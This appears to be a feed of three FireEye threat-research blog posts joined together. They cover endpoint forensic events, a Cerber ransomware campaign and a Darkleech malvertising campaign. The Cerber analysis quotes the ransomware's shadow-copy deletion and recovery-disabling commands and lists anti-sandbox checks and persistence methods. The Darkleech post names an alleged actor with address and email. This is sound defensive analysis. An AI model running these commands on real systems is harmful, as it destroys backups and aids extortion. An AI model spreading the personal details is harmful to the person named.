      <td width="162" valign="top"><p>
          <b>Field</b></p> </td> <td width="462" valign="top"><p>
          <b>Example</b></p> </td> </tr>
    <tr>
      <td width="162" valign="top"><p>Timestamp (UTC)</p> </td> <td
        width="462" valign="top"><p>
          <span class="code">2020-03-10 16:42:59.956</span></p> </td> </tr>
    <tr>
      <td width="162" valign="top"><p>Sequence Number</p> </td> <td
        width="462" valign="top"><p>
          <span class="code">2884312</span></p> </td> </tr>
    <tr>
      <td width="162" valign="top"><p>PID</p> </td> <td width="462" valign="top"><p>
          <span class="code">9392</span></p> </td> </tr>
    <tr>
      <td width="162" valign="top"><p>Process Path</p> </td> <td
        width="462" valign="top"><p>
          <span class="code">C:\Windows\Temp\legitservice.exe</span></p>
      </td> </tr>
    <tr>
      <td width="162" valign="top"><p>Username</p> </td> <td width="462" valign="top"><p>
          <span class="code">TEST-DOMAIN\BackupAdmin</span></p> </td> </tr>
    <tr>
      <td width="162" valign="top"><p>Device Path</p> </td> <td
        width="462" valign="top"><p>
          <span class="code">\Device\HarddiskVolume2</span></p> </td> </tr>
    <tr>
      <td width="162" valign="top"><p>File Path</p> </td> <td
        width="462" valign="top"><p>
          <span
        class="code">C:\Windows\Temp\WindowsServiceNT.log</span></p>
      </td> </tr>
    <tr>
      <td width="162" valign="top"><p>File MD5 Hash</p> </td> <td
        width="462" valign="top"><p>
          <span class="code">30a82a8a864b6407baf9955822ded8f9</span></p>
      </td> </tr>
    <tr>
      <td width="162" valign="top"><p>Num Bytes Seen Written</p> </td>
        <td width="462" valign="top"><p>
          <span class="code">8</span></p> </td> </tr>
    <tr>
      <td width="162" valign="top"><p>Size</p> </td> <td width="462" valign="top"><p>
          <span class="code">658</span></p> </td> </tr>
    <tr>
      <td width="162" valign="top"><p>Writes</p> </td> <td width="462" valign="top"><p>
          <span class="code">4</span></p> </td> </tr>
    <tr>
      <td width="162" valign="top"><p>Event reason</p> </td> <td
        width="462" valign="top"><p>
          <span class="code">File closed</span></p> </td> </tr>
    <tr>
      <td width="162" valign="top"><p>Closed</p> </td> <td width="462" valign="top"><p>
          <span class="code">TRUE</span></p> </td> </tr>
    <tr>
      <td width="162" valign="top"><p>Base64 Encoded<br /> Data At
          Lowest Offset</p> </td> <td width="462" valign="top"><p>
          <span
            class="code">Q3JlYXRpbmcgJ1dpbmRvd3NTZXJ2aWNlTlQubG9nJy<br />
        Bsb2dmaWxlIDogT0sNCm1pbWlrYXR6KGNvbW1hbmQ</span></p> </td> </tr>
    <tr>
      <td width="162" valign="top"><p>Text At Lowest Offset</p> </td>
        <td width="462" valign="top"><p>
          <span class="code">Creating 'WindowsServiceNT.log' logfile :
        OK....mimikatz(command</span></p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Table 5: Example real-time file write event</span></p>
 <p>Based on this real-time file write event, the malicious executable
    <span class="code">C:\Windows\Temp\legitservice.exe</span> wrote the
  file <span class="code">C:\Windows\Temp\WindowsServiceNT.log</span> to
  disk with the MD5 hash <span
  class="code">30a82a8a864b6407baf9955822ded8f9</span>. Since the
  real-time event recorded the beginning of the written file, we can
  determine the file likely contained Mimikatz credential harvester
  output which Mandiant has observed commonly starts with <span class="code">OK....mimikatz</span>.</p>
 <p>If we investigate a little later, we’ll see a process creation event
  for <span class="code">C:\Windows\Temp\taskassist.exe</span> with the
  MD5 file hash <span
  class="code">2b5cb081721b8ba454713119be062491</span> followed by
  several file write events for this process summarized in Table 6.</p>
 <table border="1" cellspacing="0" cellpadding="0" width="750"> <tbody>
    <tr>
      <td width="186" valign="top"><p>
          <b>Timestamp</b></p> </td> <td width="312" valign="top"><p>
          <b>File Path</b></p> </td> <td width="126" valign="top"><p>
          <b>File Size</b></p> </td> </tr>
    <tr>
      <td width="186" valign="top"><p>
          <span class="code">2020-03-10 16:53:42.351</span></p> </td>
        <td width="312" valign="top"><p>
          <span
        class="code">C:\Windows\Temp\WindowsServiceNT.log</span></p>
      </td> <td width="126" valign="top"><p>
          <span class="code">638</span></p> </td> </tr>
    <tr>
      <td width="186" valign="top"><p>
          <span class="code">2020-03-10 16:53:42.351</span></p> </td>
        <td width="312" valign="top"><p>
          <span
        class="code">C:\Windows\Temp\AAAAAAAAAAAAAAAA.AAA</span></p>
      </td> <td width="126" valign="top"><p>
          <span class="code">638</span></p> </td> </tr>
    <tr>
      <td width="186" valign="top"><p>
          <span class="code">2020-03-10 16:53:42.351</span></p> </td>
        <td width="312" valign="top"><p>
          <span
        class="code">C:\Windows\Temp\BBBBBBBBBBBBBBBB.BBB</span></p>
      </td> <td width="126" valign="top"><p>
          <span class="code">638</span></p> </td> </tr>
    <tr>
      <td width="186" valign="top"><p>
          <span class="code">2020-03-10 16:53:42.351</span></p> </td>
        <td width="312" valign="top"><p>
          <span
        class="code">C:\Windows\Temp\CCCCCCCCCCCCCCCC.CCC</span></p>
      </td> <td width="126" valign="top"><p>
          <span class="code">638</span></p> </td> </tr>
    <tr>
      <td width="186" valign="top"><p>
          <span class="code"> </span></p> </td> <td width="312" valign="top"><p>
          <span class="code">…</span></p> </td> <td width="126" valign="top"><p>
          <span class="code"> </span></p> </td> </tr>
    <tr>
      <td width="186" valign="top"><p>
          <span class="code">2020-03-10 16:53:42.382</span></p> </td>
        <td width="312" valign="top"><p>
          <span
        class="code">C:\Windows\Temp\XXXXXXXXXXXXXXXX.XXX</span></p>
      </td> <td width="126" valign="top"><p>
          <span class="code">638</span></p> </td> </tr>
    <tr>
      <td width="186" valign="top"><p>
          <span class="code">2020-03-10 16:53:42.382</span></p> </td>
        <td width="312" valign="top"><p>
          <span
        class="code">C:\Windows\Temp\YYYYYYYYYYYYYYYY.YYY</span></p>
      </td> <td width="126" valign="top"><p>
          <span class="code">638</span></p> </td> </tr>
    <tr>
      <td width="186" valign="top"><p>
          <span class="code">2020-03-10 16:53:42.382</span></p> </td>
        <td width="312" valign="top"><p>
          <span
        class="code">C:\Windows\Temp\ZZZZZZZZZZZZZZZZ.ZZZ</span></p>
      </td> <td width="126" valign="top"><p>
          <span class="code">638</span></p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Table 6: Example timeline of SDelete File write events</span></p>
 <p>Admittedly, this activity may seem strange at a first glance. If we
  do some research on the its file hash, we’ll see the process is
  actually SDelete masquerading as <span
  class="code">C:\Windows\Temp\taskassist.exe</span>. As part of its
  secure deletion process, <a
  href="https://docs.microsoft.com/en-us/sysinternals/downloads/sdelete">SDelete</a>
  renames the file 26 times in a successive alphabetic manner.</p>
 <h4>Network Events</h4>
 <p>Incident responders rarely see evidence of network communication
  from historical evidence on an endpoint without enhanced logging.
  Usually, Mandiant relies on NetFlow data, network sensors with full or
  partial packet capture, or malware analysis to determine the command
  and control (C2) servers with which a malware sample can communicate.
  Our solution’s real-time network events record both local and remote
  network ports, the leveraged protocol, and the relevant process.</p>
 <p>Table 7 provides an example of a real-time IPv4 network event
  recorded by our solution.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="138" valign="top"><p>
          <b>Field</b></p> </td> <td width="486" valign="top"><p>
          <b>Example</b></p> </td> </tr>
    <tr>
      <td width="138" valign="top"><p>Timestamp (UTC)</p> </td> <td
        width="486" valign="top"><p>
          <span class="code">2020-03-10 16:46:51.690</span></p> </td> </tr>
    <tr>
      <td width="138" valign="top"><p>Sequence Number</p> </td> <td
        width="486" valign="top"><p>
          <span class="code">2895588</span></p> </td> </tr>
    <tr>
      <td width="138" valign="top"><p>PID</p> </td> <td width="486" valign="top"><p>
          <span class="code">9392</span></p> </td> </tr>
    <tr>
      <td width="138" valign="top"><p>Process + Path</p> </td> <td
        width="486" valign="top"><p>
          <span class="code">C:\Windows\Temp\legitservice.exe</span></p>
      </td> </tr>
    <tr>
      <td width="138" valign="top"><p>Username</p> </td> <td width="486" valign="top"><p>
          <span class="code">TEST-DOMAIN\BackupAdmin</span></p> </td> </tr>
    <tr>
      <td width="138" valign="top"><p>Local IP Address</p> </td> <td
        width="486" valign="top"><p>
          <span class="code">10.0.0.52</span></p> </td> </tr>
    <tr>
      <td width="138" valign="top"><p>Local Port</p> </td> <td
        width="486" valign="top"><p>
          <span class="code">57472</span></p> </td> </tr>
    <tr>
      <td width="138" valign="top"><p>Remote IP Address</p> </td> <td
        width="486" valign="top"><p>
          <span class="code">10.0.0.51</span></p> </td> </tr>
    <tr>
      <td width="138" valign="top"><p>Remote Port</p> </td> <td
        width="486" valign="top"><p>
          <span class="code">443</span></p> </td> </tr>
    <tr>
      <td width="138" valign="top"><p>Protocol</p> </td> <td width="486" valign="top"><p>
          <span class="code">TCP</span></p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Table 7: Example real-time network connection event</span></p>
 <p>Based on this real-time IPv4 network event, the malicious executable
    <span class="code">C:\Windows\Temp\legitservice.exe</span> made an
  outbound TCP connection to <span class="code">10.0.0.51:443</span>.</p>
 <h4>Registry Key Events</h4>
 <p>By using historical evidence to investigate relevant timeframes and
  commonly abused registry keys, we can identify malicious or leveraged
  keys. Real-time registry key events are useful for linking processes
  to the modified registry keys. They can also show when an attacker
  deletes or renames a registry key. This is useful to an analyst
  because the only available timestamp recorded in the registry is the
  last modified time of a registry key, and this timestamp is updated if
  a parent key is updated.</p>
 <p>Table 8 provides an example of a real-time registry key event
  recorded by our solution.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="132" valign="top"><p>
          <b>Field</b></p> </td> <td width="492" valign="top"><p>
          <b>Example</b></p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>Timestamp (UTC)</p> </td> <td
        width="492" valign="top"><p>
          <span class="code">2020-03-10 16:46:56.409</span></p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>Sequence Number</p> </td> <td
        width="492" valign="top"><p>
          <span class="code">2898196</span></p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>PID</p> </td> <td width="492" valign="top"><p>
          <span class="code">9392</span></p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>Process + Path</p> </td> <td
        width="492" valign="top"><p>
          <span class="code">C:\Windows\Temp\legitservice.exe</span></p>
      </td> </tr>
    <tr>
      <td width="132" valign="top"><p>Username</p> </td> <td width="492" valign="top"><p>
          <span class="code">TEST-DOMAIN\BackupAdmin</span></p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>Event Type</p> </td> <td
        width="492" valign="top"><p>
          <span class="code">3</span></p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>Path</p> </td> <td width="492" valign="top"><p>
          <span
            class="code">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\<br />
        LegitWindowsService\ImagePath</span></p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>Key Path</p> </td> <td width="492" valign="top"><p>
          <span
        class="code">CurrentControlSet\Services\LegitWindowsService</span></p>
      </td> </tr>
    <tr>
      <td width="132" valign="top"><p>Original Path</p> </td> <td
        width="492" valign="top"><p>
          <span
        class="code">HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\LegitWindowsService</span></p>
      </td> </tr>
    <tr>
      <td width="132" valign="top"><p>Value Name</p> </td> <td
        width="492" valign="top"><p>
          <span class="code">ImagePath</span></p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>Value Type</p> </td> <td
        width="492" valign="top"><p>
          <span class="code">REG_EXPAND_SZ</span></p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>Base64 Encoded<br /> Value</p>
      </td> <td width="492" valign="top"><p>
          <span
            class="code">QwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABsAG<br />
        UAZwBpAHQAcwBlAHIAdgBpAGMAZQAuAGUAeABlAAAAAA==</span></p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>Text</p> </td> <td width="492" valign="top"><p>
          <span class="code">C:\Windows\Temp\legitservice.exe</span></p>
      </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Table 8: Example real-time registry key event</span></p>
 <p>For our solution's real-time registry events, we can map the event
  type to the operation performed using Table 9.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="132" valign="top"><p>
          <b>Event Type Value</b></p> </td> <td width="492" valign="top"><p>
          <b>Operation</b></p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>1</p> </td> <td width="492"
        valign="top"><p>PreSetValueKey</p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>2</p> </td> <td width="492"
        valign="top"><p>PreDeleteValueKey</p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>3</p> </td> <td width="492"
          valign="top"><p>PostCreateKey, PostCreateKeyEx,
        PreCreateKeyEx</p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>4</p> </td> <td width="492"
        valign="top"><p>PreDeleteKey</p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>5</p> </td> <td width="492"
        valign="top"><p>PreRenameKey</p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Table 9: FireEye Endpoint Security real-time
    registry key event types</span></p>
 <p>Based on this real-time registry key event, the malicious executable
    <span class="code">C:\Windows\Temp\legitservice.exe</span> created
  the Windows service <span class="code">LegitWindowsService</span>. If
  we investigated the surrounding registry keys, we might identify even
  more information about this malicious service.</p>
 <h4>Conclusion</h4>
 <p>The availability of real-time events designed for forensic analysis
  can fill in gaps that traditional forensic artifacts cannot on their
  own. Mandiant has seen great value in using real-time events during
  active-attacker investigations. We have used real-time events to
  determine the functionality of attacker utilities that were no longer
  present on disk, to determine users and source network addresses used
  during malicious remote desktop activity when expected corresponding
  event logs were missing, and more.</p>
 <p>Check out our <a
    href="/content/fireeye-www/en_US/products/endpoint-security.html">FireEye
    Endpoint Security page</a> and <a
  href="https://www.fireeye.com/services/freeware/redline.html">Redline</a>
  page for more information (as well as <a
    href="https://fireeye.market/apps/211364">Redline on the FireEye
  Market</a>), and take a <a
    href="https://content.fireeye.com/product-demo/webpage-endpoint-security-portal">FireEye
    Endpoint Security tour</a> today.</p>
http://www.fireeye.com/blog/threat-research/2020/05/using-real-time-events-in-investigations.html2020-05-14T15:00:00.000Z2020-07-24T06:54:28.672ZCerber: Analyzing a Ransomware Attack Methodology To Enable Protectionnoemail@noemail.orgAnkit Anubhav <p>Ransomware is a common method of cyber extortion for financial gain
  that typically involves users being unable to interact with their
  files, applications or systems until a ransom is paid. Accessibility
  of cryptocurrency such as Bitcoin has directly contributed to this
  ransomware model. Based on data from FireEye Dynamic Threat
  Intelligence (DTI), ransomware activities have been <a
    href="https://www.fireeye.com/blog/threat-research/2016/05/ransomware_activity.html">rising
    fairly steadily</a> since mid-2015.</p>
 <p>On June 10, 2016, FireEye’s HX detected a Cerber ransomware campaign
  involving the distribution of emails with a malicious Microsoft Word
  document attached. If a recipient were to open the document a
  malicious macro would contact an attacker-controlled website to
  download and install the Cerber family of ransomware.</p>
 <p>Exploit Guard, a major new feature of <a
    href="https://www.fireeye.com/products/hx-endpoint-security-products.html">FireEye
    Endpoint Security (HX)</a>, detected the threat and alerted HX
  customers on infections in the field so that organizations could
  inhibit the deployment of Cerber ransomware. After investigating
  further, the FireEye research team worked with security agency
  CERT-Netherlands, as well as web hosting providers who unknowingly
  hosted the Cerber installer, and were able to shut down that instance
  of the Cerber command and control (C2) within hours of detecting the
  activity. With the attacker-controlled servers offline, macros and
  other malicious payloads configured to download are incapable of
  infecting users with ransomware.</p>
 <p>FireEye hasn’t seen any additional infections from this attacker
  since shutting down the C2 server, although the attacker could
  configure one or more additional C2 servers and resume the campaign at
  any time. This particular campaign was observed on six unique
  endpoints from three different FireEye endpoint security customers. HX
  has proven effective at detecting and inhibiting the success of Cerber malware.</p>
 <h5>Attack Process</h5>
 <p>The Cerber ransomware attack cycle we observed can be broadly broken
  down into eight steps:</p>
 <ol> <li>Target receives and opens a Word document.</li> <li>Macro in
    document is invoked to run PowerShell in hidden mode.</li>
    <li>Control is passed to PowerShell, which connects to a malicious
    site to download the ransomware.</li> <li>On successful connection,
    the ransomware is written to the disk of the victim.</li>
    <li>PowerShell executes the ransomware.</li> <li>The malware
    configures multiple concurrent persistence mechanisms by creating
    command processor, screensaver, startup.run and runonce registry
  entries.</li> <li>The executable uses native Windows utilities such as
    WMIC and/or VSSAdmin to delete backups and shadow copies.</li>
    <li>Files are encrypted and messages are presented to the user
    requesting payment.</li> </ol>
 <p>Rather than waiting for the payload to be downloaded or started
  around stage four or five of the aforementioned attack cycle, Exploit
  Guard provides coverage for most steps of the attack cycle – beginning
  in this case at the second step.</p>
 <p>The most common way to deliver ransomware is via Word documents with
  embedded macros or a Microsoft Office exploit. FireEye Exploit Guard
  detects both of these attacks at the initial stage of the attack cycle.</p>
 <h5>PowerShell Abuse</h5>
 <p>When the victim opens the attached Word document, the malicious
  macro writes a small piece of VBScript into memory and executes it.
  This VBScript executes PowerShell to connect to an attacker-controlled
  server and download the ransomware (profilest.exe), as seen in Figure
    1.<img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/Cerber%20Analyzing%20a%20Ransomware%20Ankit/fig1.png" /></p>
 <p>
  <span class="type-XS">Figure 1. Launch sequence of Cerber – the macro
    is responsible for invoking PowerShell and PowerShell downloads and
    runs the malware</span></p>
 <p>It has been increasingly common for threat actors to use malicious
  macros to infect users because the majority of organizations permit
  macros to run from Internet-sourced office documents.</p>
 <p>In this case we observed the macrocode calling PowerShell to bypass
  execution policies – and run in hidden as well as encrypted mode –
  with the intention that PowerShell would download the ransomware and
  execute it without the knowledge of the victim.</p>
 <p>Further investigation of the link and executable showed that every
  few seconds the malware hash changed with a more current compilation
  timestamp and different appended data bytes – a technique often used
  to evade hash-based detection.</p>
 <h4>Cerber in Action</h4>
 <h5>Initial payload behavior</h5>
 <p>Upon execution, the Cerber malware will check to see where it is
  being launched from. Unless it is being launched from a specific
  location (%APPDATA%\&amp;#60GUID&amp;#62), it creates a copy of itself
  in the victim's %APPDATA% folder under a filename chosen randomly and
  obtained from the %WINDIR%\system32 folder.</p>
 <p>If the malware is launched from the specific aforementioned folder
  and after eliminating any blacklisted filenames from an internal list,
  then the malware creates a renamed copy of itself to
  “%APPDATA%\&amp;#60GUID&amp;#62” using a pseudo-randomly selected name
  from the “system32” directory. The malware executes the malware from
  the new location and then cleans up after itself.</p>
 <h5>Shadow deletion</h5>
 <p>As with many other ransomware families, Cerber will bypass UAC
  checks, delete any volume shadow copies and disable safe boot options.
  Cerber accomplished this by launching the following processes using
  respective arguments:</p>
 <p>Vssadmin.exe &quot;delete shadows /all /quiet&quot;</p>
 <p>WMIC.exe &quot;shadowcopy delete&quot;</p>
 <p>Bcdedit.exe &quot;/set {default} recoveryenabled no&quot;</p>
 <p>Bcdedit.exe &quot;/set {default} bootstatuspolicy ignoreallfailures</p>
 <h5>Coercion</h5>
 <p>People may wonder why victims pay the ransom to the threat actors.
  In some cases it is as simple as needing to get files back, but in
  other instances a victim may feel coerced or even intimidated. We
  noticed these tactics being used in this campaign, where the victim is
  shown the message in Figure 2 upon being infected with Cerber.</p>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/Cerber%20Analyzing%20a%20Ransomware%20Ankit/fig2.png" /></p>
 <p>
  <span class="type-XS">Figure 2. A message to the victim after encryption</span></p>
 <p>The ransomware authors attempt to incentivize the victim into paying
  quickly by providing a 50 percent discount if the ransom is paid
  within a certain timeframe, as seen in Figure 3.</p>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/Cerber%20Analyzing%20a%20Ransomware%20Ankit/fig3.jpeg" /></p>
 <p> </p>
 <p> </p>
 <p>
  <span class="type-XS">Figure 3. Ransom offered to victim, which is
    discounted for five days</span></p>
 <h5>Multilingual Support</h5>
 <p>As seen in Figure 4, the Cerber ransomware presented its message and
  instructions in 12 different languages, indicating this attack was on
  a global scale.</p>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/Cerber%20Analyzing%20a%20Ransomware%20Ankit/fig4.jpeg" /></p>
 <p>
  <span class="type-XS">Figure 4.   Interface provided to the victim to
    pay ransom supports 12 languages</span></p>
 <h5>Encryption</h5>
 <p>Cerber targets 294 different file extensions for encryption,
  including .doc (typically Microsoft Word documents), .ppt (generally
  Microsoft PowerPoint slideshows), .jpg and other images. It also
  targets financial file formats such as. ibank (used with certain
  personal finance management software) and .wallet (used for Bitcoin).</p>
 <h5>Selective Targeting</h5>
 <p>Selective targeting was used in this campaign. The attackers were
  observed checking the country code of a host machine’s public IP
  address against a list of blacklisted countries in the JSON
  configuration, utilizing online services such as ipinfo.io to verify
  the information. Blacklisted (protected) countries include:
    <i>Armenia, Azerbaijan, Belarus, Georgia, Kyrgyzstan, Kazakhstan,
    Moldova, Russia, Turkmenistan, Tajikistan, Ukraine, and Uzbekistan</i>.</p>
 <p>The attack also checked a system's keyboard layout to further ensure
  it avoided infecting machines in the attackers geography:
    <i>1049—Russian, ¨ 1058—Ukrainian, 1059—Belarusian, 1064—Tajik,
    1067—Armenian, 1068—Azeri, (Latin), 1079—Georgian, 1087—Kazakh,
    1088—Kyrgyz (Cyrillic), 1090—Turkmen, 1091—Uzbek (Latin),
    2072—Romanian (Moldova), 2073—Russian (Moldova), 2092—Azeri
    (Cyrillic), 2115—Uzbek (Cyrillic).</i></p>
 <p>Selective targeting has historically been used to keep malware from
  infecting endpoints within the author’s geographical region, thus
  protecting them from the wrath of local authorities. The actor also
  controls their exposure using this technique. In this case, there is
  reason to suspect the attackers are based in Russia or the surrounding region.</p>
 <h5>Anti VM Checks</h5>
 <p>The malware searches for a series of hooked modules, specific
  filenames and paths, and known sandbox volume serial numbers,
  including: sbiedll.dll, dir_watch.dll, api_log.dll, dbghelp.dll,
  Frz_State, C:\popupkiller.exe, C:\stimulator.exe,
  C:\TOOLS\execute.exe, \sand-box\, \cwsandbox\, \sandbox\, 0CD1A40,
  6CBBC508, 774E1682, 837F873E, 8B6F64BC.</p>
 <p>Aside from the aforementioned checks and blacklisting, there is also
  a wait option built in where the payload will delay execution on an
  infected machine before it launches an encryption routine. This
  technique was likely implemented to further avoid detection within
  sandbox environments.</p>
 <h5>Persistence</h5>
 <p>Once executed, Cerber deploys the following persistence techniques
  to make sure a system remains infected:</p>
 <ul> <li>A registry key is added to launch the malware instead of the
    screensaver when the system becomes idle.</li> <li>The
    “CommandProcessor” Autorun keyvalue is changed to point to the
    Cerber payload so that the malware will be launched each time the
    Windows terminal, “cmd.exe”, is launched.</li> <li>A shortcut (.lnk)
    file is added to the startup folder. This file references the
    ransomware and Windows will execute the file immediately after the
    infected user logs in.</li> <li>Common persistence methods such as
    run and runonce key are also used.</li> </ul>
 <h5>A Solid Defense<br /> </h5>
 <p>Mitigating ransomware malware has become a high priority for
  affected organizations because passive security technologies such as
  signature-based containment have proven ineffective.<br /> <br />
  Malware authors have demonstrated an ability to outpace most endpoint
  controls by compiling multiple variations of their malware with minor
  binary differences. By using alternative packers and compilers,
  authors are increasing the level of effort for researchers and
  reverse-engineers. Unfortunately, those efforts don’t scale.<br />
  <br /> Disabling support for macros in documents from the Internet and
  increasing user awareness are two ways to reduce the likelihood of
  infection. If you can, consider blocking connections to websites you
  haven’t explicitly whitelisted. However, these controls may not be
  sufficient to prevent all infections or they may not be possible based
  on your organization.<br /> <br /> <a
    href="/content/fireeye-www/site-content/en_US/retired-pages-do-not-activate/hx-endpoint-security-datasheet-pf-ep.html"
    target="_blank">FireEye Endpoint Security</a> with Exploit Guard
  helps to detect exploits and techniques used by ransomware attacks
  (and other threat activity) during execution and provides analysts
  with greater visibility. This helps your security team conduct more
  detailed investigations of broader categories of threats. This
  information enables your organization to quickly stop threats and
  adapt defenses as needed.</p>
 <h5>Conclusion</h5>
 <p>Ransomware has become an increasingly common and effective attack
  affecting enterprises, impacting productivity and preventing users
  from accessing files and data.</p>
 <p>Mitigating the threat of ransomware requires strong endpoint
  controls, and may include technologies that allow security personnel
  to quickly analyze multiple systems and correlate events to identify
  and respond to threats.</p>
 <p>
  <a href="/content/fireeye-www/en_US/products/endpoint-security.html"
    target="_blank">HX with Exploit Guard</a> uses behavioral
  intelligence to accelerate this process, quickly analyzing endpoints
  within your enterprise and alerting your team so they can conduct an
  investigation and scope the compromise in real-time.</p>
 <p>Traditional defenses don’t have the granular view required to do
  this, nor can they connect the dots of discreet individual processes
  that may be steps in an attack. This takes behavioral intelligence
  that is able to quickly analyze a wide array of processes and alert on
  them so analysts and security teams can conduct a complete
  investigation into what has, or is, transpiring. This can only be done
  if those professionals have the right tools and the visibility into
  all endpoint activity to effectively find every aspect of a threat and
  deal with it, all in real-time. Also, at FireEye, we go one step ahead
  and contact relevant authorities to bring down these types of campaigns.</p>
 <p>Click <a
  href="http://investors.fireeye.com/releasedetail.cfm?ReleaseID=958361">here</a>
  for more information about Exploit Guard technology.</p>
http://www.fireeye.com/blog/threat-research/2016/07/cerber-ransomware-attack.html2016-07-18T12:00:00.000Z2020-07-24T06:54:28.648ZAnother Darkleech Campaignnoemail@noemail.orgJ. Gomez<p>Last week got us up close and personal with Darkleech and Blackhole
  with our <i>external</i> careers web site.</p>
 <p>The fun didn’t end there, this week we saw a tidal wave of Darkleech
  activity linked to a large-scale <a
  href="http://en.wikipedia.org/wiki/Malvertising">malvertising</a>
  campaign identified by the following URL:</p>
 <p>hXXp://delivery[.]globalcdnnode[.]com/7f01baa99716452bda5bba0572c58be9/afr-zone.php</p>
 <p>Again Darkleech was up to its tricks, injecting URLs and sending
  victims to a landing page belonging to the Blackhole Exploit Kit, one
  of the most popular and effective exploit kits available today.
  Blackhole wreaks havoc on computers by exploiting vulnerabilities in
  client applications like IE, Java and Adobe, computers that are
  vulnerable to exploits launched by Blackhole are likely to become
  infected with one of several flavors of malware including <a
  href="/content/fireeye-www/en_US/products/ransomware.html">ransomware</a>,
  Zeus/Zbot variants and <a
  href="http://en.wikipedia.org/wiki/Click_fraud">clickfraud</a> trojans
  like ZeroAccess.</p>
 <p>We started logging hits at 21:31:00 UTC on Sunday 09/22/2013, the
  campaign has been ongoing, peaking Monday and tapered down through out
  the week.</p>
 <p>During most of the campaign’s run,
  <i>delivery[.]globalcdnnode[.]com</i> appeared to have gone dark, no
  longer serving the exploit kit’s landing page as expected and then
  stopped resolving altogether, yet tons of requests kept flowing.</p>
 <p>This left some scratching their heads as to whether the noise was a
  real threat.</p>
 <p>Indeed, <i>it was a real threat,</i> as Blackhole showed up to the
  party a couple of days later; this was confirmed by actually
  witnessing a system get attacked on a subsequent visit to the URL.</p>
 <p> </p>
 <p>
  <a href="/content/dam/legacy/blog/2013/10/globalcdn_BHEK.png"><img
      class="alignnone size-full wp-image-3425 landscape-lg"
      alt="globalcdn_BHEK"
      src="https://www.fireeye.com/content/dam/legacy/blog/2013/10/globalcdn_BHEK.png"
      width="912" height="401" /></a></p>
 <p>
  <b>Figure 1. – Session demonstrating exploit via IE browser and Java.</b></p>
 <p> </p>
 <p>The server returned the (obfuscated) Blackhole Landing page; no 404
  this time.</p>
 <p>
  <a href="/content/dam/legacy/blog/2013/10/Darkleech_LANDING.png"><img
      class="alignnone size-full wp-image-3428 landscape-med"
      alt="Darkleech_LANDING"
      src="https://www.fireeye.com/content/dam/legacy/blog/2013/10/Darkleech_LANDING.png"
      width="705" height="390" /></a></p>
 <p>
  <b>Figure 2 – request and response to to delivery[.]globalcdnnode[.]com.</b></p>
 <p> </p>
 <p>The next stage was to load a new URL for the malicious jar file. At
  this point, the unpatched Windows XP system running vulnerable Java
  quickly succumbed to <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-0422">CVE-2013-0422</a>.</p>
 <p>
  <a href="/content/dam/legacy/blog/2013/10/Darkleech_JAVA.png"><img
      class="alignnone size-full wp-image-3427 landscape-lg"
      alt="Darkleech_JAVA"
      src="https://www.fireeye.com/content/dam/legacy/blog/2013/10/Darkleech_JAVA.png"
      width="939" height="321" /></a></p>
 <p>
  <b>Figure 3 – Packet capture showing JAR file being downloaded.</b></p>
 <p>
  <a
      href="/content/dam/legacy/blog/2013/10/Darkleech_Java_Classes.png"><img
      class="alignnone size-full wp-image-3424 portrait-sm"
      alt="Darkleech_Java_Classes"
      src="https://www.fireeye.com/content/dam/legacy/blog/2013/10/Darkleech_Java_Classes.png"
      width="296" height="335" /></a></p>
 <p>
  <b>Figure 4. – Some of the Java class files visible in the downloaded Jar.</b></p>
 <p> </p>
 <p>Even though our system was exploited and the browser was left in a
  hung state, it did not receive the payload. Given the sporadic
  availability during the week of both the host and exploit kit’s
  landing page, it’s possible the system is or was undergoing further
  setup and this is the <i>prelude</i> to yet another large-scale campaign.</p>
 <p>We can’t say for sure but we know this is not the last time we will
  see it or the crimeware actor behind it.</p>
 <p>Registrant:</p>
 <p>Name: Alexey Prokopenko<br /> Organization: home<br /> Address:
  Lenina 4, kv 1<br /> City: Ubileine<br /> Province/state: LUGANSKA
  OBL<br /> Country: UA<br /> Postal Code: 519000<br /> Email: alex1978a @bigmir.net</p>
 <p>By the way, this <a
  href="https://www.google.com/#q=alex1978a%40bigmir.net">actor</a> has
  a long <a
  href="http://www.malwaredomainlist.com/mdl.php?search=alex1978a%40bigmir.net&amp;colsearch=Registrant&amp;quantity=200&amp;inactive=on">history</a>
  of malicious activity online too.</p>
 <p>The campaign also appears to be abusing Amazon Web Services.</p>
 <p>globalcdnnode.com<br /> Server:           ns-293.awsdns-36.com<br />
  Address:    205.251.193.37#53</p>
 <p>globalcdnnode.com<br /> origin = ns-293.awsdns-36.com<br /> mail
  addr = awsdns-hostmaster.amazon.com</p>
 <p>At time of this writing, the domain delivery[.]globalcdnnode[.]com
  was still resolving, using <a
  href="http://www.honeynet.org/papers/ff/">fast-flux</a> DNS techniques
  to resolve to a different IP address every couple minutes, thwarting
